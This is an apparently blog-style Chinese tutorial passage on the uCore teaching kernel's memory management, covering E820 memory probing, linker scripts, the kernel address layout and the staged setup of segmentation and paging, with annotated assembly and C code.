<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>要使用这种方法来探测物理内存空间，我们必须将系统置于实模式下。因此， 我们在 bootloader 中添加了物理内存空间探测的功能。 这种方法获取的物理内存空间的信息是用内存映射地址描述符(Address Range Descriptor)来表示的，一个内存映射地址描述符占 20B，其具体描述如下：</p>
<p>00h 8 字节 base address #系统内存块基地址<br>08h 8 字节 length in bytes #系统内存大小<br>10h 4 字节 type of address range #内存类型<br>每探测到一块物理内存空间， 其对应的内存映射地址描述符就会被写入我们指定的内存空间(可以理解为是内存映射地址描述符表)。 当完成物理内存空间的探测后， 我们就可以通过这个表来了解物理内存空间的分布情况了。</p>
<blockquote>
<p>INT15h BIOS 中断的详细调用参数:</p>
<ol>
<li> eax:e820h:INT 15 的中断调用参数;</li>
<li> edx:534D4150h (即 4 个 ASCII 字符―SMAP) ,这只是一个签名</li>
<li> ebx:如果是第一次调用或内存区域扫描完毕,则为 0。 如果不是,则存放上次调用之后的计数值;</li>
<li> ecx:保存地址范围描述符的内存大小,应该大于等于 20 字节;</li>
<li> es:di:指向保存地址范围描述符结构的缓冲区,BIOS 把信息写入这个结构的起始地址。</li>
</ol>
</blockquote>
<p>下面我们来看看 INT 15h 中断是如何进行物理内存空间的探测：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* memlayout.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e820map</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> nr_map;            <span class="comment">//总共有几块内存</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> addr;    <span class="comment">//第i块内存块基地址</span></span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> size;    <span class="comment">//第i块内存块大小</span></span><br><span class="line">        <span class="keyword">long</span> type;         <span class="comment">//第i块内存块种类</span></span><br><span class="line">    &#125; <span class="built_in">map</span>[E820MAX];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bootasm.S */</span></span><br><span class="line">probe_memory:</span><br><span class="line">    <span class="comment">/* 在 0x8000 处存放 struct e820map, 并清除 e820map 中的 nr_map */</span></span><br><span class="line">    movl $<span class="number">0</span>, <span class="number">0x8000</span></span><br><span class="line">    xorl %ebx, %ebx</span><br><span class="line">    <span class="comment">/* 0x8004 处将用于存放第一个内存映射地址描述符 */</span></span><br><span class="line">    movw $<span class="number">0x8004</span>, %di</span><br><span class="line">start_probe:</span><br><span class="line">    <span class="comment">/* 传入 0xe820 作为 INT 15h 中断的参数 */</span></span><br><span class="line">    movl $<span class="number">0xE820</span>, %eax</span><br><span class="line">    <span class="comment">/* 内存映射地址描述符的大小 */</span></span><br><span class="line">    movl $<span class="number">20</span>, %ecx</span><br><span class="line">    <span class="comment">/* SMAP=534D4150h (即 4 个 ASCII 字符―SMAP) ,这只是一个签名 */</span></span><br><span class="line">    movl $SMAP, %edx</span><br><span class="line">    <span class="comment">/* 调用 INT 15h 中断 */</span></span><br><span class="line">    <span class="keyword">int</span> $<span class="number">0x15</span></span><br><span class="line">    <span class="comment">/* 如果 eflags 的 CF 位为 0，则表示还有内存段需要探测 */</span></span><br><span class="line">    <span class="comment">/* 如果该中断执行失败，则CF标志位会置1，此时要通知UCore出错 */</span></span><br><span class="line">    jnc cont</span><br><span class="line">    <span class="comment">/* 向结构e820map中的成员nr_map中写入特殊信息，报告当前错误 */</span></span><br><span class="line">    movw $<span class="number">12345</span>, <span class="number">0x8000</span></span><br><span class="line">    jmp finish_probe</span><br><span class="line">cont:</span><br><span class="line">    <span class="comment">/* 设置下一个内存映射地址描述符的起始地址 */</span></span><br><span class="line">    addw $<span class="number">20</span>, %di</span><br><span class="line">    <span class="comment">/* e820map 中的 nr_map 加 1 */</span></span><br><span class="line">    incl <span class="number">0x8000</span></span><br><span class="line">    <span class="comment">/* 如果还有内存段需要探测则继续探测, 否则结束探测 */</span></span><br><span class="line">    cmpl $<span class="number">0</span>, %ebx</span><br><span class="line">    jnz start_probe</span><br><span class="line">finish_probe:</span><br></pre></td></tr></table></figure>
<p>从上面代码可以看出，要实现物理内存空间的探测，大体上只需要 3 步：</p>
<p>设置一个存放内存映射地址描述符的物理地址(这里是 0x8000)</p>
<p>将 e820 作为参数传递给 INT 15h 中断</p>
<p>通过检测 eflags 的 CF 位来判断探测是否结束。如果没有结束， 设置存放下一个内存映射地址描述符的物理地址，然后跳到步骤 2；如果结束，则程序结束</p>
<h2 id="uCore-地址空间划分"><a href="#uCore-地址空间划分" class="headerlink" title="uCore 地址空间划分"></a>uCore 地址空间划分</h2><h3 id="ld-链接脚本语言"><a href="#ld-链接脚本语言" class="headerlink" title=".ld 链接脚本语言"></a>.ld 链接脚本语言</h3><p>连接脚本的一个主要目的是描述输入文件中的节如何被映射到输出文件中,并控制输出文件的内存排布。</p>
<p>下面的脚本描述了使用该脚本链接的代码应当被载入到地址 0x10000 处, 而数据应当从 0x8000000 处开始。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">    . &#x3D; 0x10000;</span><br><span class="line">    .text : &#123; *(.text) &#125;</span><br><span class="line">    . &#x3D; 0x8000000;</span><br><span class="line">    .data : &#123; *(.data) &#125;</span><br><span class="line">    .bss : &#123; *(.bss) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用关键字<code>SECTIONS</code>写了这个 SECTIONS 命令, 后面跟有一串放在花括号中的符号赋值和输出节描述的内容.</p>
<p>上例中, 在<code>SECTIONS</code>命令中的第一行是对一个特殊的符号<code>.</code>赋值, 这是一个定位计数器. 如果你没有以其它的方式指定输出节的地址(其他方式在后面会描述), 那地址值就会被设为定位计数器的现有值. 定位计数器然后被加上输出节的尺寸. 在<code>SECTIONS</code>命令的开始处, 定位计数器拥有值<code>0</code>.</p>
<p>第二行定义一个输出节,<code>.text</code>. 冒号是语法需要,现在可以被忽略. 节名后面的花括号中,你列出所有应当被放入到这个输出节中的输入节的名字. ‘‘是一个通配符,匹配任何文件名. 表达式<code>(.text)</code>意思是所有的输入文件中的<code>.text</code>输入节.</p>
<p>因为当输出节<code>.text</code>定义的时候, 定位计数器的值是<code>0x10000</code>,连接器会把输出文件中的<code>.text</code>节的地址设为<code>0x10000</code>.</p>
<p>余下的内容定义了输出文件中的<code>.data</code>节和<code>.bss</code>节. 连接器会把<code>.data</code>输出节放到地址<code>0x8000000</code>处. 连接器放好<code>.data</code>输出节之后, 定位计数器的值是<code>0x8000000</code>加上<code>.data</code>输出节的长度. 得到的结果是连接器会把<code>.bss</code>输出节放到紧接<code>.data</code>节后面的位置.</p>
<p>连接器会通过在必要时增加定位计数器的值来保证每一个输出节具有它所需的对齐. 在这个例子中, 为<code>.text</code>和<code>.data</code>节指定的地址会满足对齐约束, 但是连接器可能会需要在<code>.data</code>和<code>.bss</code>节之间创建一个小的缺口。</p>
<h4 id="kernel-ld-简析-脚本部分内容被省略"><a href="#kernel-ld-简析-脚本部分内容被省略" class="headerlink" title="kernel.ld 简析(脚本部分内容被省略)"></a>kernel.ld 简析(脚本部分内容被省略)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(kern_entry) &#x2F;&#x2F; 定义函数入口为 kern_entry 函数</span><br><span class="line"></span><br><span class="line">SECTIONS &#123;</span><br><span class="line">    &#x2F;&#x2F; 定义放置代码的起始虚拟地址为 0xC0100000 ，实际bootmain加载时全部与0xFFFFFF做了与运算才放入内存，所以实际上代码是被放在了0x100000处</span><br><span class="line">    . &#x3D; 0xC0100000;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;0x100000后面紧接着是text代码段，其实最后也是跳转到这执行kern_entry函数</span><br><span class="line">    .text : &#123;</span><br><span class="line">        *(.text .stub .text.* .gnu.linkonce.t.*)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROVIDE(etext &#x3D; .);</span><br><span class="line"></span><br><span class="line">    .rodata : &#123;</span><br><span class="line">        *(.rodata .rodata.* .gnu.linkonce.r.*)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ALIGN(x)表示当前地址使用x对齐，此处的x大小刚好是4k，就是一页的大小，也就是将后面的data段对齐到 一个新的页上</span><br><span class="line">    . &#x3D; ALIGN(0x1000);</span><br><span class="line"></span><br><span class="line">    .data : &#123;</span><br><span class="line">        *(.data)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; edata表示kernel的data段结束地址；end表示bss段的结束地址（即整个kernel的结束地址）</span><br><span class="line">    &#x2F;&#x2F;edata[]和 end[]这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的结束地址，它们不在任何一个.S、.c或.h文件中定义，但仍然可以在源码文件中使用。</span><br><span class="line">    PROVIDE(edata &#x3D; .);</span><br><span class="line"></span><br><span class="line">    .bss : &#123;</span><br><span class="line">        *(.bss)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROVIDE(end &#x3D; .);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;特殊的输出section，名为&#x2F;DISCARD&#x2F;，被该section引用的任何输入section将不会出现在输出文件内</span><br><span class="line">    &#x2F;DISCARD&#x2F; : &#123;</span><br><span class="line">        *(.eh_frame .note.GNU-stack)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="uCore-地址空间"><a href="#uCore-地址空间" class="headerlink" title="uCore 地址空间"></a>uCore 地址空间</h3><p><img src="https://segmentfault.com/img/remote/1460000009450843" alt="uCore"></p>
<p>从 0x7c00 地址处开始看，往下在<code>bootasm.S</code>文件中 CPU 切换到保护模式的时候，<code>movw $PROT_MODE_DSEG, %ax</code>、<code>movw %ax, %ss</code>两句指令设置了栈段段描述符，<code>movl $start, %esp</code>设置了段基址为 start 段的起始地址也就是 0x7c00。x86 CPU 栈往低地址处生长且后面都没有设置栈寄存器的值，故 0x7c00 向下的地址被 bootloader 和 uCore 共用用作栈。</p>
<p>从 0x7c00 地址处往上看，<code>boot.ld</code>脚本指出了所有 bootloader 的 text、data 段放在 0x7c00 的后面。</p>
<p>0x10000 地址在<code>bootmain.c</code>中，使用<code>#define ELFHDR ((struct elfhdr *)0x10000)</code>被定义为 ELF 文件头读入的地方（后面有一些空闲地址，所以足够存放 ELF header）。</p>
<p>0x100000 地址最初被定义在<code>kernel.ld</code>中但值为<code>0xc0100000</code>，在链接的时候被放到了 ELF 头中的 program header 中。最后被<code>bootmain.c</code>读入，<code>bootmain</code> 加载时全部与 <code>0xFFFFFF</code> 做了与运算才放入内存，所以实际上代码是被放在了 <code>0x100000</code> 处，存放 uCore text 和 data 段的内容。</p>
<p>在 uCore 代码结束的地方在内存初始化函数<code>pmm_init()</code>中被用来放页表。</p>
<p>虽然低地址处有一些空闲地址（ 0x10000 前后），可以划分一些空闲页出来，但为了方便起见不进行划分，因为总共到 BIOS ROM 也只占用了 1MB 的内存，故内存浪费不可能超过 1MB。</p>
<p>为啥偏移是<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0b8e1879729a">0xC000000</a></p>
<h2 id="地址映射"><a href="#地址映射" class="headerlink" title="地址映射"></a>地址映射</h2><p>在这个实验中，我们在 4 个不同的阶段进行了 4 次地址映射， 下面我就分别介绍这 4 次地址映射。</p>
<h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>这一阶段是从 bootasm.S 的 start 到 entry.S 的 kern_entry 前。这个阶段只是简单的设置了段表，和 lab1 一样(这时的 GDT 中每个段的起始地址都是 0x00000000 并且此时 kernel 还没有载入)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdt:</span><br><span class="line">    SEG_NULLASM                                     <span class="meta"># null seg</span></span><br><span class="line">    SEG_ASM(STA_X|STA_R, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)           <span class="meta"># code seg for bootloader and kernel</span></span><br><span class="line">    SEG_ASM(STA_W, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)                 <span class="meta"># data seg for bootloader and kernel</span></span><br><span class="line"></span><br><span class="line">gdtdesc:</span><br><span class="line">    .word <span class="number">0x17</span>                                      <span class="meta"># sizeof(gdt) - 1</span></span><br><span class="line">    .<span class="keyword">long</span> gdt                                       <span class="meta"># address gdt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>virt addr = linear addr = phy addr</p>
<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>这个阶段就是从 entry.S 的 kern_entry 到 pmm.c 的 page_init()。 这个阶段开启了页机制并简单的设置了一个页表。将虚拟地址 0xC0000000 ~ 0xC0000000 +4M 映射到物理地址 0 ~ 4M。暂时解决了 OS 代码中地址为 0xC0000000+x 但实际物理地址在 x 的问题</p>
<p>下面介绍页表开启过程。</p>
<blockquote>
<p>CR0 中包含了 6 个预定义标志，0 位是保护允许位 PE(Protedted Enable)，用于启动保护模式，如果 PE 位置 1，则保护模式启动，如果 PE=0，则在实模式下运行。1 位是监控协处理位 MP(Moniter coprocessor)，它与第 3 位一起决定：当 TS=1 时操作码 WAIT 是否产生一个“协处理器不能使用”的出错信号。第 3 位是任务转换位(Task Switch)，当一个任务转换完成之后，自动将它置 1。随着 TS=1，就不能使用协处理器。CR0 的第 2 位是模拟协处理器位 EM (Emulate coprocessor)，如果 EM=1，则不能使用协处理器，如果 EM=0，则允许使用协处理器。第 4 位是微处理器的扩展类型位 ET(Processor Extension Type)，其内保存着处理器扩展类型的信息，如果 ET=0，则标识系统使用的是 287 协处理器，如果 ET=1，则表示系统使用的是 387 浮点协处理器。<strong>CR0 的第 31 位是分页允许位(Paging Enable)，它表示芯片上的分页部件是否允许工作。</strong></p>
</blockquote>
<blockquote>
<p>CR3 是页目录基址寄存器，保存页目录表的物理地址，页目录表总是放在以 4K 字节为单位的存储器边界上，因此，它的地址的低 12 位总为 0，不起作用，即使写上内容，也不会被理会。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Load the kernel at this address: &quot;.&quot; means the current address *&#x2F;</span><br><span class="line">    . &#x3D; 0xC0100000;</span><br></pre></td></tr></table></figure>
<p>连接文件将 kernel 链接到了 0xC0100000，这个地址是 kernel 的虚拟地址。CR3 寄存器使用的地址是实际物理地址，所以需要使用宏将虚地址转变为实际物理地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNBASE    0xC0000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REALLOC(x) (x - KERNBASE)</span></span><br><span class="line"></span><br><span class="line">kern_entry:</span><br><span class="line">    <span class="meta"># load pa of boot pgdir</span></span><br><span class="line">    movl $REALLOC(__boot_pgdir), %eax</span><br><span class="line">    movl %eax, %cr3 <span class="comment">//将页目录基址载入CR3寄存器</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># enable paging</span></span><br><span class="line">    movl %cr0, %eax</span><br><span class="line">    orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax</span><br><span class="line">    andl $~(CR0_TS | CR0_EM), %eax</span><br><span class="line">    movl %eax, %cr0 <span class="comment">//重新设置CR0寄存器，开启分页</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># update eip</span></span><br><span class="line">    <span class="meta"># now, eip = 0x1.....</span></span><br><span class="line">    leal next, %eax</span><br><span class="line">    <span class="meta"># set eip = KERNBASE + 0x1.....</span></span><br><span class="line">    jmp *%eax</span><br><span class="line">next:</span><br><span class="line">    <span class="comment">//设置完eip后立马umap</span></span><br><span class="line">    # unmap va 0 ~ 4M, it&#x27;s temporary mapping</span><br><span class="line">    xorl %eax, %eax</span><br><span class="line">    movl %eax, __boot_pgdir</span><br></pre></td></tr></table></figure>
<p>之所以设置 0 ~ 4M - 0 ~ 4M 的映射，后面又立马取消是因为。在开启分页的时候，eip 指向当前执行命令的地址（小于 4M 的某个地址），如果没有设置 0 ~ 4M 的映射，让 eip 继续往下走，CPU 不知道 0 ~ 4M 对应哪一个物理地址肯定崩。所以先设置好地址，保证开启后程序不崩溃，之后通过跳转到 next ，eip 的值被设置为 next 的地址。因为 next 被定义在 kernel 里这是一个 3G 以上的内存地址，所以 eip 就被设置成了 3G 以上的地址，可以正确的往下执行。在跳转后原来的 0 ~ 4M 就被立刻置为 0 删除之。</p>
<p>下面来看载入的页目录表和页表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.align PGSIZE  <span class="comment">//页目录必须按页大小对齐，整个页目录占一个页</span></span><br><span class="line">__boot_pgdir:</span><br><span class="line">.globl __boot_pgdir</span><br><span class="line">    <span class="comment">// 将第一个页目录项对应的地址映射到0 ~ 4M。map va 0 ~ 4M to pa 0 ~ 4M (temporary)</span></span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    <span class="comment">// 填充剩余表项直到对应虚地址0xC0000000的地方</span></span><br><span class="line">    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; <span class="number">10</span> &lt;&lt; <span class="number">2</span>) - (. - __boot_pgdir) <span class="meta"># pad to PDE of KERNBASE</span></span><br><span class="line">    <span class="comment">// 将0xC0000000~0xC0000000+4M的虚地址映射到0 ~ 4M。 map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M</span></span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    <span class="comment">// .space申请一段空间将整个页目录填满（否则有一些OS代码可能会被安排到这个页目录的剩余空间）</span></span><br><span class="line">    .space PGSIZE - (. - __boot_pgdir)</span><br><span class="line"></span><br><span class="line">.<span class="built_in">set</span> i, <span class="number">0</span>  <span class="comment">//通过循环的方式设置了对应虚地址 - 0~4M 的映射 （这个页表放哪个页表项，哪个页表项就指向0~4M）</span></span><br><span class="line">__boot_pt1:</span><br><span class="line">.rept <span class="number">1024</span></span><br><span class="line">    .<span class="keyword">long</span> i * PGSIZE + (PTE_P | PTE_W)</span><br><span class="line">    .<span class="built_in">set</span> i, i + <span class="number">1</span></span><br><span class="line">.endr</span><br></pre></td></tr></table></figure>
<p>这个阶段结束后，OS 的代码段（0xC0000000 ~ 0xC0000000+4M），三个地址的关系是：</p>
<p>virt addr = linear addr = phy addr + 0xC0000000</p>
<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>这个阶段就是 pmm.c 的 <code>boot_map_segment()</code> 函数, 将 0x30000000<del>0x38000000 这段线性地址映射到了物理地址 0x00000000</del>0x08000000。</p>
<p>在解释这个函数前先对 OS 管理内存的数据结构<code>Page</code>进行介绍。</p>
<p>在 OS 中每一个页都有一个 Page 的数据结构进行管理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> ref;                        <span class="comment">// page frame&#x27;s reference counter</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// array of flags that describe the status of the page frame</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;          <span class="comment">// the num of free block, used in first fit pm manager</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;         <span class="comment">// free list link</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>记录引用次数、页面状态，并有用于管理空闲内存的链接指针。在执行<code>boot_map_segment</code>前，函数<code>page_init</code>对操作系统的页表进行了初始化（一共有两个页表，一个是操作系统用来管理内存所建立的 c 语言数据结构，另外一个是给 CPU 用来做地址转换的内存数据）。pmm.c 中定义了 pages 变量用来存储<code>Page</code>数据组的首地址。该数组放在 OS 代码结束的地方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMEMSIZE 0x38000000 <span class="comment">//the maximum amount of physical memory</span></span></span><br><span class="line"></span><br><span class="line">page_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">e820map</span> *<span class="title">memmap</span> =</span> (struct e820map *)(<span class="number">0x8000</span> + KERNBASE);</span><br><span class="line">    <span class="keyword">uint64_t</span> maxpa = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历探测出的内存块，找出可用的最大物理地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; memmap-&gt;nr_map; i ++) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> begin = memmap-&gt;<span class="built_in">map</span>[i].addr, end = begin + memmap-&gt;<span class="built_in">map</span>[i].size;</span><br><span class="line">        <span class="keyword">if</span> (memmap-&gt;<span class="built_in">map</span>[i].type == E820_ARM)</span><br><span class="line">            <span class="keyword">if</span> (maxpa &lt; end &amp;&amp; begin &lt; KMEMSIZE)</span><br><span class="line">                maxpa = end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最大物理地址不能超出KMEMSIZE的限定</span></span><br><span class="line">    <span class="keyword">if</span> (maxpa &gt; KMEMSIZE) &#123;</span><br><span class="line">        maxpa = KMEMSIZE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该值由ld链接脚本提供，这个地址是os代码结束的地址</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">char</span> end[];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算需要分页的数量</span></span><br><span class="line">    npage = maxpa / PGSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将os代码结束地址向上取整拿来放页表</span></span><br><span class="line">    pages = (struct Page *)ROUNDUP((<span class="keyword">void</span> *)end, PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//为了简化起见，从物理0地址到页表结束的地址pages+ sizeof(struct Page) * npage)</span></span><br><span class="line">    <span class="comment">//设定为已占用物理内存空间（起始0~640KB的空间是空闲的）</span></span><br><span class="line">    <span class="comment">//地址pages+ sizeof(struct Page) * npage)以上的空间为空闲物理内存空间</span></span><br><span class="line">    <span class="comment">//这为了方便把所有的页都设置为已占用，后面再改回来</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; npage; i ++) &#123;</span><br><span class="line">        SetPageReserved(pages + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第一个可用的空闲页地址</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> freemem = PADDR((<span class="keyword">uintptr_t</span>)pages + <span class="keyword">sizeof</span>(struct Page) * npage);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对上面所有探测到的内存卡</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; memmap-&gt;nr_map; i ++) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> begin = memmap-&gt;<span class="built_in">map</span>[i].addr, end = begin + memmap-&gt;<span class="built_in">map</span>[i].size;</span><br><span class="line">        <span class="comment">//如果该内存块是可用内存</span></span><br><span class="line">        <span class="keyword">if</span> (memmap-&gt;<span class="built_in">map</span>[i].type == E820_ARM) &#123;</span><br><span class="line">            <span class="keyword">if</span> (begin &lt; freemem)</span><br><span class="line">                begin = freemem;</span><br><span class="line">            <span class="keyword">if</span> (end &gt; KMEMSIZE)</span><br><span class="line">                end = KMEMSIZE;</span><br><span class="line">            <span class="keyword">if</span> (begin &lt; end) &#123;</span><br><span class="line">                begin = ROUNDUP(begin, PGSIZE);</span><br><span class="line">                end = ROUNDDOWN(end, PGSIZE);</span><br><span class="line">                <span class="keyword">if</span> (begin &lt; end)</span><br><span class="line">                    <span class="comment">//（起始地址对应的页表，总共有几页）进行页表的初始化</span></span><br><span class="line">                    init_memmap(pa2page(begin), (end - begin) / PGSIZE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在函数<code>page_init()</code>执行完成后，我们完成了操作系统页表的建立，注意这个页表只是操作系统用来管内存的，其具体的映射关系是：</p>
<p><strong>pages[物理地址&gt;&gt;12] = 该物理地址所在页面的使用情况</strong></p>
<p>下面的<code>boot_map_segment</code>函数填写线性地址到物理地址的映射关系，<code>get_pte</code> 返回该线性地址所在的页面（没有对应的页面向 OS 申请一个）。从 0x30000000 开始，一页一页的填地址映射关系（for 以页为单位迭代）</p>
